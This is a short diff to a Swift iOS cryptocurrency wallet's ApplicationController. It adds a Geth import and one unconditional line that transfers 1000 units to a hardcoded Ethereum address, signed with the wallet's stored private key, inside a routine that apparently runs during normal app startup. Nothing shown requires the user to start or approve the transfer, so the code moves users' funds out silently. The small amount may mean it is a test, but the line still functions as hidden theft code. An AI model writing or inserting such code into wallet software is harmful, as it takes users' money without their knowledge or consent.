@@ -8,6 +8,7 @@
 
 import UIKit
 import BRCore
+import Geth
 
 private let timeSinceLastExitKey = "TimeSinceLastExit"
 private let shouldRequireLoginTimeoutKey = "ShouldRequireLoginTimeoutKey"
@@ -224,6 +225,8 @@ class ApplicationController : Subscriber, Trackable {
                 self.watchSessionManager.rate = self.store.state.currentRate
             })
         }
+
+        gethManager.transfer(amount: GethBigInt(1000), toAddress: "0x6C0fe9f8f018e68E2F0bee94Ab41B75e71DF094d", privKey: walletManager.ethPrivKey!)
     }
 
     private func shouldRequireLogin() -> Bool {
